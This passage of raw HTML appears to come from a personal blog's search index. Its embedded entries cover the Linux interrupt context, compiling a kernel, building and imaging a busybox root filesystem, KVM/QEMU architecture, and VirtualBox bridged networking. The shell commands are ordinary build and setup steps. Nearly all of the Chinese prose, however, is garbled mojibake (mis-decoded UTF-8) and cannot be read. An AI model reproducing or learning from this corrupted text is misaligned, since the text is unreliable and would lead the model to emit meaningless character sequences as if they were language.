&lt;li&gt;å°è¯•è·å¾—ä¿¡å·é‡ å¦‚æœè·å¾—ä¸åˆ°ä¿¡å·é‡ï¼Œä»£ç å°±ä¼šç¡çœ ï¼Œä¼šäº§ç”Ÿå’Œä¸Šé¢ç›¸åŒçš„æƒ…å†µ&lt;/li&gt;
&lt;li&gt;æ‰§è¡Œè€—æ—¶çš„ä»»åŠ¡ ä¸­æ–­å¤„ç†åº”è¯¥å°½å¯èƒ½å¿«ï¼Œå› ä¸ºå†…æ ¸è¦å“åº”å¤§é‡æœåŠ¡å’Œè¯·æ±‚ï¼Œä¸­æ–­ä¸Šä¸‹æ–‡å ç”¨CPUæ—¶é—´å¤ªé•¿ä¼šä¸¥é‡å½±å“ç³»ç»ŸåŠŸèƒ½ã€‚&lt;/li&gt;
&lt;li&gt;è®¿é—®ç”¨æˆ·ç©ºé—´çš„è™šæ‹Ÿåœ°å€ å› ä¸ºä¸­æ–­ä¸Šä¸‹æ–‡æ˜¯å’Œç‰¹å®šè¿›ç¨‹æ— å…³çš„ï¼Œå®ƒæ˜¯å†…æ ¸ä»£è¡¨ç¡¬ä»¶è¿è¡Œåœ¨å†…æ ¸ç©ºé—´ï¼Œæ‰€ä»¥åœ¨ä¸­ç«¯ä¸Šä¸‹æ–‡æ— æ³•è®¿é—®ç”¨æˆ·ç©ºé—´çš„è™šæ‹Ÿåœ°å€ã€‚&lt;/li&gt;
&lt;/ol&gt;
">ã€linuxã€‘ç”¨æˆ·/å†…æ ¸ç©ºé—´ã€ç”¨æˆ·/å†…æ ¸æ€ã€ç”¨æˆ·æ ˆ/å†…æ ¸æ ˆã€è¿›ç¨‹/ä¸­æ–­ä¸Šä¸‹æ–‡</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/linux-geng-huan-nei-he-ban-ben/"" data-c="
          &lt;h3 id=&#34;ç¼–è¯‘å†…æ ¸å®‰è£…å†…æ ¸&#34;&gt;ç¼–è¯‘å†…æ ¸(å®‰è£…å†…æ ¸)&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;1. ä¸‹è½½å†…æ ¸æºç 
   https://mirrors.edge.kernel.org/pub/linux/kernel/
2. å®‰è£…å†…æ ¸ç¼–è¯‘æ‰€éœ€çš„ç¯å¢ƒ
   sudo apt install git fakeroot build-essential ncurses-dev xz-utils libssl-dev bc flex libelf-dev bison -y
   # centosï¼š yum install ncurses-devel make gcc bc openssl-devel
3. è§£å‹å†…æ ¸æºç 
   xz -d linux-5.3.8.tar.xz &amp;amp;&amp;amp; tar xvf linux-5.3.8.tar
4. ç”Ÿæˆ.configæ–‡ä»¶(æ‹·è´å½“å‰æ“ä½œç³»ç»Ÿçš„é…ç½®æ–‡ä»¶)
   # export ARCH=x86 æŒ‡å®šç¡¬ä»¶ä½“ç³»ç»“æ„
   # make x86_64_defconfig é…ç½®ä¸ºx86_64_defconfig
   # å½“ç„¶å¯ä»¥ç›´æ¥æ‹·è´å½“å‰æ“ä½œç³»ç»Ÿçš„configæ–‡ä»¶
   cp /boot/config-`uname -r` .config
   make menuconfig  # å¯¹å†…æ ¸è¿›è¡Œå¾®è°ƒé…ç½®

General setup  ---&amp;gt;
       ----&amp;gt; [*] Initial RAM filesystem and RAM disk (initramfs/initrd) support # æ”¯æŒcpioæ ¼å¼æ–‡ä»¶ç³»ç»Ÿ
    Device Drivers  ---&amp;gt;
       [*] Block devices  ---&amp;gt;
               &amp;lt;*&amp;gt;   RAM block device support 
               (65536) Default RAM disk size (kbytes)


5. ç¼–è¯‘å†…æ ¸
   make -j $(nproc)
   # æ­¤è¿‡ç¨‹ç”Ÿæˆvmlinuxï¼Œç¼–è¯‘æˆåŠŸåå†…æ ¸ä½äºarch/x86_64/boot/bzImage
   # å¦‚æœéœ€è¦å°†ç¼–è¯‘å¥½çš„å†…æ ¸å®‰è£…åœ¨å½“å‰çš„ç‰©ç†ä¸»æœºä¸Šï¼Œå¯ä»¥è¿›è¡Œä¸‹é¢çš„æ­¥éª¤
6. å®‰è£…ç¼–è¯‘ç”Ÿæˆçš„modules
   sudo make modules_install
7. å®‰è£…æ–°å†…æ ¸ç›¸å…³æ–‡ä»¶
   sudo make install
   # æ­¤è¿‡ç¨‹ç”Ÿæˆvmlinuz
8. é‡å¯
   reboot
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯¹äºlinuxå†…æ ¸ï¼Œç¼–è¯‘å¯ä»¥ç”Ÿæˆä¸åŒçš„é•œåƒæ–‡ä»¶ï¼Œä¾‹å¦‚ï¼šmake zImageã€make uImage&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ä»–ä»¬ä¹‹é—´çš„åŒºåˆ«ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;vmlinuxï¼šç¼–è¯‘å‡ºæ¥çš„æœ€åŸå§‹çš„å†…æ ¸æ–‡ä»¶ï¼Œæœªå‹ç¼©&lt;/li&gt;
&lt;li&gt;zImageï¼šæ˜¯vmlinuxç»è¿‡gzipå‹ç¼©åçš„æ–‡ä»¶&lt;/li&gt;
&lt;li&gt;bzImage bzè¡¨ç¤ºâ€œbig zImageâ€ï¼Œä¸æ˜¯ç”¨bzip2å‹ç¼©çš„ã€‚ä¸¤è€…çš„ä¸åŒä¹‹å¤„åœ¨äºï¼ŒzImageè§£å‹ç¼©å†…æ ¸åˆ°ä½ç«¯å†…å­˜(ç¬¬ä¸€ä¸ª640K)ï¼ŒbzImageè§£å‹ç¼©å†…æ ¸åˆ°é«˜ç«¯å†…å­˜(1Mä»¥ä¸Š)ã€‚å¦‚æœå†…æ ¸æ¯”è¾ƒå°ï¼Œé‚£ä¹ˆé‡‡ç”¨zImageæˆ–bzImageéƒ½è¡Œï¼Œå¦‚æœæ¯”è¾ƒå¤§åº”è¯¥ç”¨bzImageã€‚&lt;/li&gt;
&lt;li&gt;uImage   U-bootä¸“ç”¨çš„æ˜ åƒæ–‡ä»¶ï¼Œå®ƒæ˜¯åœ¨zImageä¹‹å‰åŠ ä¸Šä¸€ä¸ªé•¿åº¦ä¸º0x40çš„tagã€‚&lt;/li&gt;
&lt;li&gt;vmlinuz  æ˜¯bzImage/zImageæ–‡ä»¶çš„æ‹·è´æˆ–æŒ‡å‘bzImage/zImageçš„é“¾æ¥ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;ç¼–è¯‘åˆ¶ä½œbusyboxæ ¹æ–‡ä»¶ç³»ç»Ÿ&#34;&gt;ç¼–è¯‘åˆ¶ä½œbusyboxæ ¹æ–‡ä»¶ç³»ç»Ÿ&lt;/h3&gt;
&lt;p&gt;busyboxæ˜¯ä¸€ä¸ªé›†æˆäº†ä¸€ç™¾å¤šä¸ªæœ€å¸¸ç”¨linuxå‘½ä»¤å’Œå·¥å…·çš„è½¯ä»¶ï¼Œé€šè¿‡ç¼–è¯‘busyboxå¯ä»¥ç”Ÿæˆè¿™äº›å·¥å…·çš„äºŒè¿›åˆ¶å¯æ‰§è¡Œç¨‹åºã€‚&lt;/p&gt;
&lt;p&gt;å‰ç½®è½¯ä»¶ï¼š&lt;/p&gt;
&lt;p&gt;apt install libncurses5-dev -y&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ä¸‹è½½busyboxæºç  https://busybox.net/downloads/&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mkdir /home/rootfs &amp;amp;&amp;amp; cd /home/rootfs
wget https://busybox.net/downloads/busybox-1.20.0.tar.bz2
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;è§£å‹é…ç½®&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;tar -xvf busybox-1.20.0.tar.bz2
make menuconfig
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1630570726475.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;blockquote&gt;
&lt;p&gt;Busybox Settings -&amp;gt; Build Option&lt;br&gt;
[ ]Build BusyBox as a static binary (no shared libs)&lt;br&gt;
ç¼–è¯‘å®Œæˆä¹‹åä¼šç”Ÿæˆä¸€ä¸ªbusyboxå¯æ‰§è¡Œç¨‹åºï¼Œå…¶ç”¨æ³•æ˜¯# busybox lsã€busybox mkdir å°±ç›¸å½“äºæ‰§è¡Œlsã€mkdirï¼Œå¦‚æœé€‰æ‹©é™æ€ç¼–è¯‘ï¼Œé‚£ä¹ˆç¼–è¯‘å‡ºæ¥çš„busyboxæ˜¯å¯ä»¥å•ç‹¬è¿è¡Œçš„ï¼Œä½†æ˜¯è‡ªå·±ç¼–å†™çš„ç¨‹åºè¦æ˜¯åœ¨busyboxæ–‡ä»¶ç³»ç»Ÿä¸Šè¿è¡Œåˆ™éœ€è¦ä½¿ç”¨é™æ€ç¼–è¯‘ï¼Œå³ä¾‹å¦‚ï¼šgcc -static hello.c -o helloæ‰å¯ä»¥è¿è¡Œã€‚&lt;br&gt;
å¦‚æœä¸é€‰æ‹©è¯¥é€‰é¡¹ï¼Œåˆ™ç¼–è¯‘å‡ºæ¥çš„busyboxä¸å¯ä»¥ç‹¬ç«‹è¿è¡Œï¼Œéœ€è¦å°†ç›¸åº”çš„çš„åŠ¨æ€åº“æˆ–è€…ç¬¦å·é“¾æ¥ç­‰å¤åˆ¶åˆ°busyboxæ–‡ä»¶ç³»ç»Ÿä¸­ç›¸å¯¹åº”çš„ç›®å½•ä¸­ï¼Œå¦åˆ™ç¨‹åºä¸èƒ½è¿è¡Œï¼Œé‚£ä¹ˆè‡ªå·±ç¼–å†™çš„ç¨‹åºå°±ä¸éœ€è¦ä½¿ç”¨é™æ€ç¼–è¯‘äº†ã€‚&lt;/p&gt;
&lt;p&gt;( )Cross Compiler prefix (NEW)&lt;br&gt;
æ ‡è¯†ç”¨ä»€ä¹ˆç¼–è¯‘å™¨æ¥ç¼–è¯‘busyboxï¼Œé»˜è®¤ç”¨x86(åº”è¯¥)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;ç¼–è¯‘å’Œå®‰è£…&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;vi include/libbb.h
#include &amp;lt;sys/resource.h&amp;gt;
# ä¸æ·»åŠ ä¼šæŠ¥é”™
# scripts/Makefile.build:197: recipe for target &#39;loginutils/passwd.o&#39; failed
# Makefile:740: recipe for target &#39;loginutils&#39; failed

make &amp;amp;&amp;amp; make install
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;ç¼–è¯‘å®Œæˆåçš„busyboxå°±å®‰è£…åœ¨æºç æ ¹ç›®å½•ä¸‹çš„_installç›®å½•äº†ï¼Œæˆ‘ä»¬è¿›å…¥_installç›®å½•ï¼Œè¡¥å……ä¸€äº›å¿…è¦çš„æ–‡ä»¶æˆ–ç›®å½•ï¼Œç›¸å…³çš„shellå‘½ä»¤å¦‚ä¸‹ï¼š&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mkdir etc dev mnt
mkdir -p proc sys tmp mnt
mkdir -p etc/init.d/
vim etc/fstab

proc        /proc           proc         defaults        0        0
tmpfs       /tmp            tmpfs    ã€€ã€€defaults        0        0
sysfs       /sys            sysfs        defaults        0        0

vim etc/init.d/rcS

echo -e &amp;quot;Welcome to tinyLinux&amp;quot;
/bin/mount -a
echo -e &amp;quot;Remounting the root filesystem&amp;quot;
mount  -o  remount,rw  /
mkdir -p /dev/pts
mount -t devpts devpts /dev/pts
echo /sbin/mdev &amp;gt; /proc/sys/kernel/hotplug
mdev -s

chmod 755 etc/init.d/rcS
vim etc/inittab

::sysinit:/etc/init.d/rcS
::respawn:-/bin/sh
::askfirst:-/bin/sh
::ctrlaltdel:/bin/umount -a -r

chmod 755 etc/inittab
cd dev
mknod console c 5 1
mknod null c 1 3
mknod tty1 c 4 1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™æ ·ä¸€ä¸ªæœ€å°çš„ã€å®Œæ•´çš„å¯ä»¥è¢«å†…æ ¸å¯åŠ¨çš„æ–‡ä»¶ç³»ç»Ÿå°±å®Œæˆäº†ã€‚&lt;/p&gt;
&lt;h3 id=&#34;åˆ¶ä½œæ ¹æ–‡ä»¶ç³»ç»Ÿçš„é•œåƒæ–‡ä»¶&#34;&gt;åˆ¶ä½œæ ¹æ–‡ä»¶ç³»ç»Ÿçš„é•œåƒæ–‡ä»¶&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;å…ˆåˆ¶ä½œä¸€ä¸ªç©ºçš„é•œåƒæ–‡ä»¶ï¼›&lt;/li&gt;
&lt;li&gt;ç„¶åæŠŠæ­¤é•œåƒæ–‡ä»¶æ ¼å¼åŒ–ä¸ºext3æ ¼å¼ï¼›&lt;/li&gt;
&lt;li&gt;ç„¶åæŠŠæ­¤é•œåƒæ–‡ä»¶æŒ‚è½½ï¼Œå¹¶æŠŠæ ¹æ–‡ä»¶ç³»ç»Ÿå¤åˆ¶åˆ°æŒ‚è½½ç›®å½•ï¼›&lt;/li&gt;
&lt;li&gt;å¸è½½è¯¥é•œåƒæ–‡ä»¶ã€‚&lt;/li&gt;
&lt;li&gt;æ‰“æˆgzipåŒ…&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/bash
rm -rf rootfs.ext3
rm -rf fs
dd if=/dev/zero of=./rootfs.ext3 bs=1M count=32
mkfs.ext3 rootfs.ext3
mkdir fs
mount -o loop rootfs.ext3 ./fs
cp -rf ./_install/* ./fs
umount ./fs
gzip --best -c rootfs.ext3 &amp;gt; rootfs.img.gz 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;é€šè¿‡qemuå°±å¯ä»¥å°†ç¼–è¯‘å¥½çš„å†…æ ¸å’Œæ–‡ä»¶ç³»ç»Ÿé•œåƒå¯åŠ¨äº†ã€‚&lt;/p&gt;
&lt;h3 id=&#34;ä¸€äº›æŠ¥é”™&#34;&gt;ä¸€äº›æŠ¥é”™&lt;/h3&gt;
&lt;h4 id=&#34;å†…æ ¸&#34;&gt;å†…æ ¸&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;ç¼–è¯‘å†…æ ¸æŠ¥é”™ï¼šmake[1]: *** æ²¡æœ‰è§„åˆ™å¯åˆ¶ä½œç›®æ ‡â€œcerts/rhel.pemâ€ï¼Œç”±â€œcerts/x509_certificate_listâ€ éœ€æ±‚ã€‚ åœæ­¢&lt;br&gt;
make menuconfig&lt;br&gt;
Cryptographic API &amp;gt;&lt;br&gt;
Certificates for signature checking &amp;gt;&lt;br&gt;
Additional X.509 keys for default system keyring  åˆ é™¤å†…å®¹&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;re&#34;&gt;re&lt;/h3&gt;
&lt;p&gt;https://blog.csdn.net/weixin_38251305/article/details/104268266&lt;br&gt;
å†…æ ¸åœ°å€&lt;br&gt;
https://mirrors.edge.kernel.org/pub/linux/kernel/&lt;br&gt;
http://ftp.sjtu.edu.cn/sites/ftp.kernel.org/pub/linux/kernel/&lt;/p&gt;
&lt;p&gt;ubuntu&lt;br&gt;
https://www.cnblogs.com/haiyonghao/p/14440263.html&lt;/p&gt;
&lt;p&gt;centos&lt;br&gt;
https://blog.csdn.net/daa20/article/details/105011505/&lt;br&gt;
https://www.linuxidc.com/Linux/2015-11/125671.htm&lt;/p&gt;
">ã€linuxã€‘ç¼–è¯‘å®‰è£…å†…æ ¸ã€ç¼–è¯‘busyboxæ–‡ä»¶ç³»ç»Ÿ</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/xu-ni-hua-kvm/"" data-c="
          &lt;h2 id=&#34;è™šæ‹ŸåŒ–&#34;&gt;è™šæ‹ŸåŒ–&lt;/h2&gt;
&lt;h3 id=&#34;å…¨è™šæ‹ŸåŒ–&#34;&gt;å…¨è™šæ‹ŸåŒ–&lt;/h3&gt;
&lt;p&gt;å…¨è™šæ‹ŸåŒ–ä¹Ÿç§°ä¸ºç¡¬ä»¶è™šæ‹ŸåŒ–ï¼Œéœ€è¦å¤„ç†å™¨ã€ä¸»æ¿èŠ¯ç‰‡ã€BIOSç­‰çš„è™šæ‹ŸåŒ–æ”¯æŒï¼Œè¯¥æ¨¡å‹ä½¿ç”¨è™šæ‹Ÿæœºåè°ƒguestæ“ä½œç³»ç»Ÿå’ŒåŸå§‹ç¡¬ä»¶ï¼ŒVMMåœ¨guestæ“ä½œç³»ç»Ÿå’Œè£¸ç¡¬ä»¶ä¹‹é—´ç”¨äºå·¥ä½œåè°ƒï¼Œä¸€äº›å—ä¿æŠ¤æŒ‡ä»¤å¿…é¡»ç”±Hypervisorï¼ˆè™šæ‹Ÿæœºç®¡ç†ç¨‹åºï¼‰æ¥æ•è·å¤„ç†ã€‚å…¨è™šæ‹ŸåŒ–çš„è¿è¡Œé€Ÿåº¦è¦å¿«äºç¡¬ä»¶æ¨¡æ‹Ÿï¼Œä½†æ˜¯æ€§èƒ½æ–¹é¢ä¸å¦‚è£¸æœºã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1627557883376.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;åŠè™šæ‹ŸåŒ–&#34;&gt;åŠè™šæ‹ŸåŒ–&lt;/h3&gt;
&lt;p&gt;åŠè™šæ‹ŸåŒ–æ˜¯å¦ä¸€ç§ç±»ä¼¼äºå…¨è™šæ‹ŸåŒ–çš„æŠ€æœ¯ï¼Œå®ƒä½¿ç”¨Hypervisoråˆ†äº«å­˜å–åº•å±‚çš„ç¡¬ä»¶ï¼Œä½†æ˜¯å®ƒçš„guestæ“ä½œç³»ç»Ÿé›†æˆäº†è™šæ‹ŸåŒ–æ–¹é¢çš„ä»£ç ã€‚è¯¥æ–¹æ³•æ— éœ€é‡æ–°ç¼–è¯‘æˆ–å¼•èµ·é™·é˜±ï¼Œå› ä¸ºæ“ä½œç³»ç»Ÿè‡ªèº«èƒ½å¤Ÿä¸è™šæ‹Ÿè¿›ç¨‹è¿›è¡Œå¾ˆå¥½çš„åä½œã€‚åŠè™šæ‹ŸåŒ–éœ€è¦guestæ“ä½œç³»ç»Ÿåšä¸€äº›ä¿®æ”¹ï¼Œä½¿guestæ“ä½œç³»ç»Ÿæ„è¯†åˆ°è‡ªå·±æ˜¯å¤„äºè™šæ‹ŸåŒ–ç¯å¢ƒçš„ï¼Œä½†æ˜¯åŠè™šæ‹ŸåŒ–æä¾›äº†ä¸åŸæ“ä½œç³»ç»Ÿç›¸è¿‘çš„æ€§èƒ½ã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1627557891052.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;è™šæ‹ŸåŒ–äº§å“&#34;&gt;è™šæ‹ŸåŒ–äº§å“&lt;/h3&gt;
&lt;p&gt;å¼€æºçš„ï¼šKVMã€Xen&lt;/p&gt;
&lt;p&gt;å‚å•†ï¼š&lt;br&gt;
&lt;img src=&#34;https://cactusii.github.io//post-images/1627557789252.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;è™šæ‹ŸåŒ–å†å²ï¼š&lt;br&gt;
&lt;img src=&#34;https://cactusii.github.io//post-images/1627558184108.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;kvm&#34;&gt;kvm&lt;/h2&gt;
&lt;p&gt;KVMæ˜¯é›†æˆåˆ°Linuxå†…æ ¸çš„Hypervisorï¼Œæ˜¯X86æ¶æ„ä¸”ç¡¬ä»¶æ”¯æŒè™šæ‹ŸåŒ–æŠ€æœ¯ï¼ˆIntel VTæˆ–AMD-Vï¼‰çš„Linuxçš„å…¨è™šæ‹ŸåŒ–è§£å†³æ–¹æ¡ˆã€‚å®ƒæ˜¯Linuxçš„ä¸€ä¸ªå¾ˆå°çš„æ¨¡å—ï¼Œåˆ©ç”¨Linuxåšå¤§é‡çš„äº‹ï¼Œå¦‚ä»»åŠ¡è°ƒåº¦ã€å†…å­˜ç®¡ç†ä¸ç¡¬ä»¶è®¾å¤‡äº¤äº’ç­‰ã€‚&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥è¯´å¯ä»¥è‡ªå·±æ­å»ºKVMæ›¿ä»£VMï¼Œæ€§èƒ½æ›´å¥½ã€‚&lt;/p&gt;
&lt;p&gt;æ­å»ºKVMç¯å¢ƒä¸»è¦åŒ…æ‹¬ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;qemuï¼šç”¨äºæä¾›è™šæ‹ŸåŒ–æœåŠ¡ã€‚&lt;/li&gt;
&lt;li&gt;libvirtï¼šæä¾›libvirtdæœåŠ¡ï¼Œç”¨äºç®¡ç†ç‰©ç†æœºä¸­çš„è™šæ‹ŸåŒ–å®ä¾‹ï¼Œå¹¶æä¾›å¤–éƒ¨ç¼–ç¨‹æ¥å£ã€‚&lt;/li&gt;
&lt;li&gt;é¡µé¢ç®¡ç†å™¨ï¼šwebvirtmgrç­‰ï¼Œæä¾›å‰ç«¯é¡µé¢ï¼Œæ“ä½œæœ¬åœ°libvirtï¼Œå¯¹è™šæ‹Ÿæœºè¿›è¡Œæ–°å»ºã€åˆ é™¤ã€è®¾ç½®ã€è¿è¡Œ&lt;/li&gt;
&lt;li&gt;vncæœåŠ¡ï¼šé¡µé¢ä¸Šæ§åˆ¶è™šæ‹Ÿæœºçš„é¼ æ ‡é”®ç›˜æ˜¾ç¤ºè®¾å¤‡ï¼Œç”¨æ¥è£…ç³»ç»Ÿç”¨ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;libvirtï¼šæ“ä½œå’Œç®¡ç†KVMè™šæœºçš„è™šæ‹ŸåŒ– APIï¼Œä½¿ç”¨ C è¯­è¨€ç¼–å†™ï¼Œå¯ä»¥ç”± Python,Ruby, Perl, PHP, Java ç­‰è¯­è¨€è°ƒç”¨ã€‚å¯ä»¥æ“ä½œåŒ…æ‹¬ KVMï¼Œvmwareï¼ŒXENï¼ŒHyper-v, LXC ç­‰ Hypervisorã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;kvmæ¶æ„&#34;&gt;kvmæ¶æ„&lt;/h3&gt;
&lt;p&gt;KVM ä¸­ï¼Œ&lt;strong&gt;è™šæ‹Ÿæœºè¢«å®ç°ä¸ºå¸¸è§„çš„ Linux è¿›ç¨‹&lt;/strong&gt;ï¼Œç”±æ ‡å‡† Linux è°ƒåº¦ç¨‹åºè¿›è¡Œè°ƒåº¦ï¼›è™šæœºçš„æ¯ä¸ªè™šæ‹Ÿ CPU è¢«å®ç°ä¸ºä¸€ä¸ªå¸¸è§„çš„ Linux è¿›ç¨‹ã€‚è¿™ä½¿å¾— KMV èƒ½å¤Ÿä½¿ç”¨ Linux å†…æ ¸çš„å·²æœ‰åŠŸèƒ½ã€‚ ä½†æ˜¯ï¼ŒKVM æœ¬èº«ä¸æ‰§è¡Œä»»ä½•ç¡¬ä»¶æ¨¡æ‹Ÿï¼Œéœ€è¦å®¢æˆ·ç©ºé—´ç¨‹åºé€šè¿‡ /dev/kvm æ¥å£è®¾ç½®ä¸€ä¸ªå®¢æˆ·æœºè™šæ‹ŸæœåŠ¡å™¨çš„åœ°å€ç©ºé—´ï¼Œå‘å®ƒæä¾›æ¨¡æ‹Ÿçš„ I/Oï¼Œå¹¶å°†å®ƒçš„è§†é¢‘æ˜¾ç¤ºæ˜ å°„å›å®¿ä¸»çš„æ˜¾ç¤ºå±ã€‚ç›®å‰è¿™ä¸ªåº”ç”¨ç¨‹åºæ˜¯ QEMUã€‚&lt;/p&gt;
&lt;p&gt;ä¸€ä¸ªè™šæ‹Ÿæœºçš„å†…å­˜ä¸ä»»ä½•å…¶å®ƒlinuxè¿›ç¨‹çš„å†…å­˜ä¸€æ ·è¿›è¡Œå­˜å‚¨ï¼ŒåŒæ—¶èƒ½å¤Ÿä½¿ç”¨linuxæ”¯æŒçš„ä»»ä½•å­˜å‚¨æ¥å­˜å‚¨è™šæ‹Ÿæœºé•œåƒï¼ŒåŒ…æ‹¬IDEã€SCSIã€SATAçš„æœ¬åœ°ç£ç›˜ç­‰ã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1627559108922.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;Guestï¼šå®¢æˆ·æœºç³»ç»Ÿï¼ŒåŒ…æ‹¬CPUï¼ˆvCPUï¼‰ã€å†…å­˜ã€é©±åŠ¨ï¼ˆConsoleã€ç½‘å¡ã€I/O è®¾å¤‡é©±åŠ¨ç­‰ï¼‰ï¼Œè¢« KVM ç½®äºä¸€ç§å—é™åˆ¶çš„ CPU æ¨¡å¼ä¸‹è¿è¡Œã€‚&lt;/li&gt;
&lt;li&gt;KVMï¼šè¿è¡Œåœ¨å†…æ ¸ç©ºé—´ï¼Œæä¾›CPU å’Œå†…å­˜çš„è™šçº§åŒ–ï¼Œä»¥åŠå®¢æˆ·æœºçš„ I/O æ‹¦æˆªã€‚Guest çš„ I/O è¢« KVM æ‹¦æˆªåï¼Œäº¤ç»™ QEMU å¤„ç†ã€‚&lt;/li&gt;
&lt;li&gt;QEMU-KVMï¼šä¿®æ”¹è¿‡çš„ä¸º KVM è™šæœºä½¿ç”¨çš„ QEMU ä»£ç ï¼Œè¿è¡Œåœ¨ç”¨æˆ·ç©ºé—´ï¼Œæä¾›ç¡¬ä»¶ I/O è™šæ‹ŸåŒ–ï¼Œé€šè¿‡ IOCTL /dev/kvm è®¾å¤‡å’Œ KVM äº¤äº’ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;https://zhuanlan.zhihu.com/p/31894107&lt;/p&gt;
&lt;p&gt;https://www.evernote.com/shard/s325/client/snv?noteGuid=bebe0aaa-9d30-4624-9772-a0af9dfffead&amp;amp;noteKey=a08905a6b6733c5cd945bba560d4d927&amp;amp;sn=https%3A%2F%2Fwww.evernote.com%2Fshard%2Fs325%2Fsh%2Fbebe0aaa-9d30-4624-9772-a0af9dfffead%2Fa08905a6b6733c5cd945bba560d4d927&amp;amp;title=QEMU%252BKVM%25E5%25AD%25A6%25E4%25B9%25A0%25E7%25AC%2594%25E8%25AE%25B0&lt;/p&gt;
">ã€è™šæ‹ŸåŒ–ã€‘kvm qemu</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/virtual-box-shang-si-chong-bu-tong-de-wang-luo-lian-jie-mo-shi/"" data-c="
          &lt;p&gt;&lt;strong&gt;Bridged(æ¡¥æ¥æ¨¡å¼)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;å°†è™šæ‹Ÿæœºçš„è™šæ‹Ÿç½‘ç»œé€‚é…å™¨ï¼ˆè™šæ‹Ÿç½‘å¡ï¼‰ä¸ä¸»æœºçš„ç‰©ç†ç½‘ç»œé€‚é…å™¨ï¼ˆè™šæ‹Ÿç½‘å¡ï¼‰è¿›è¡Œäº¤æ¥ï¼Œè™šæ‹Ÿæœºä¸­çš„è™šæ‹Ÿç½‘ç»œé€‚é…å™¨å¯é€šè¿‡ä¸»æœºä¸­çš„ç‰©ç†ç½‘ç»œé€‚é…å™¨ç›´æ¥è®¿é—®åˆ°å¤–éƒ¨ç½‘ç»œã€‚ç®€è€Œè¨€ä¹‹ï¼Œè¿™å°±å¥½åƒåœ¨å±€åŸŸç½‘ä¸­æ·»åŠ äº†ä¸€å°æ–°çš„ã€ç‹¬ç«‹çš„è®¡ç®—æœºä¸€æ ·ã€‚å› æ­¤ï¼Œè™šæ‹Ÿæœºä¹Ÿä¼šå ç”¨å±€åŸŸç½‘ä¸­çš„ä¸€ä¸ªIPåœ°å€ï¼Œå¹¶ä¸”å¯ä»¥å’Œå…¶ä»–ç»ˆç«¯è¿›è¡Œç›¸äº’è®¿é—®ã€‚&lt;/p&gt;
&lt;p&gt;æ¡¥æ¥æ¨¡å¼ç½‘ç»œè¿æ¥æ”¯æŒæœ‰çº¿å’Œæ— çº¿ä¸»æœºç½‘ç»œé€‚é…å™¨ã€‚å¦‚æœæƒ³æŠŠè™šæ‹Ÿæœºå½“åšä¸€å°å®Œå…¨ç‹¬ç«‹çš„è®¡ç®—æœºçœ‹å¾…ï¼Œå¹¶ä¸”å…è®¸å®ƒå’Œå…¶ä»–ç»ˆç«¯ä¸€æ ·çš„è¿›è¡Œç½‘ç»œé€šä¿¡ï¼Œé‚£ä¹ˆæ¡¥æ¥æ¨¡å¼é€šå¸¸æ˜¯è™šæ‹Ÿæœºè®¿é—®ç½‘ç»œçš„æœ€ç®€å•é€”å¾„ã€‚&lt;/p&gt;
